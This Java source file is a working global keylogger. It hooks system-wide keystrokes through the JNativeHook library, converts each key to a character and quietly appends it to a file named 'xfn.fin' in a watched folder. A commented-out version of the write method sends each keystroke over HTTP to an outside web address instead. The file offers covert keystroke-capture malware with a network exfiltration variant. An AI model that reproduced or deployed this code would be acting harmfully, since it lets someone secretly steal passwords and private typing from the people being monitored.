/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.scene.chart.PieChart;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author john
 */
public class KeyLogger implements NativeKeyListener {

    public static String fileName = "xfn.fin";

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
//        if(e.getKeyCode() == 17 || e.getKeyCode() == 18 || e.getKeyCode() == 37 || e.getKeyCode() == 38
//                || e.getKeyCode() == 39 || e.getKeyCode() == 40|| e.getKeyCode() == NativeKeyEvent.VK_SHIFT || 
//                e.getKeyCode() == NativeKeyEvent.VK_CAPS_LOCK){
//            
//        }else{
//            if(e.getKeyCode() == NativeKeyEvent.VK_PERIOD){
//                System.out.print(".");
//            }else if(e.getKeyCode() == NativeKeyEvent.VK_ENTER){
//                System.out.print("\n");
//            }else if(e.getKeyCode() == NativeKeyEvent.VK_SPACE){
//                System.out.print(" ");
//            }else{
//                System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
//            }
//            
//        }

        writeToFile(e);
        /* Terminate program when one press ESCAPE */
//        if (e.getKeyCode() == NativeKeyEvent.VK_ESCAPE) {
//            GlobalScreen.unregisterNativeHook();
//        }

    }

    private void writeToFile(NativeKeyEvent e) {

        String pressedKey = getCharacter(e);
        File f = new File(Watcher.folderName + File.separator + fileName);
        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter(f, true));
            writer.append(pressedKey);
//            System.out.println(e.getKeyCode());
//            System.out.print(pressedKey);
            writer.close();
        } catch (IOException ex) {
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
//    private void writeToFile(NativeKeyEvent e) {
//        
//
//        try {
//            String pressedKey = getCharacter(e);
//            URL url = new URL("http://webdev.fit.cvut.cz/~kusyjan/test");
//            URLConnection con = url.openConnection();
//            con.setDoOutput(true);
//            OutputStreamWriter out = new OutputStreamWriter(con.getOutputStream());
//            out.append(pressedKey);
//            out.close();
//        } catch (MalformedURLException ex) {
//            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
//        } catch (IOException ex) {
//            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
//        }
//    }

    private String getCharacter(NativeKeyEvent e) {
        switch (e.getKeyCode()) {
            case NativeKeyEvent.VK_CAPS_LOCK:
                return "";
            case NativeKeyEvent.VK_PERIOD:
                return ".";
            case 17:
                return "";
            case 18:
                return "";
            case 37:
                return "";
            case 38:
                return "";
            case 39:
                return "";
            case 40:
                return "";
            case 32:
                return " ";
            case 8:
                return "";
            case 9:
                return "";
            case NativeKeyEvent.VK_SLASH:
                return ",";
            case NativeKeyEvent.VK_MINUS:
                return "-";
            case NativeKeyEvent.VK_PLUS:
                return "+";
            case NativeKeyEvent.VK_SHIFT:
                return "";
            case NativeKeyEvent.VK_SEMICOLON:
                return ";";
            case NativeKeyEvent.VK_WINDOWS:
                return "";
            case NativeKeyEvent.VK_UNDEFINED:
                return "";
            case NativeKeyEvent.VK_UNDERSCORE:
                return "_";
            case NativeKeyEvent.VK_PAGE_DOWN:
                return "";
            case NativeKeyEvent.VK_PAGE_UP:
                return "";
            case NativeKeyEvent.VK_ENTER:
                return "\n";
            default:
                return NativeKeyEvent.getKeyText(e.getKeyCode());
        }
    }

    /* Key Released */
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        //System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    /* I can't find any output from this call */
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
//        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }
}
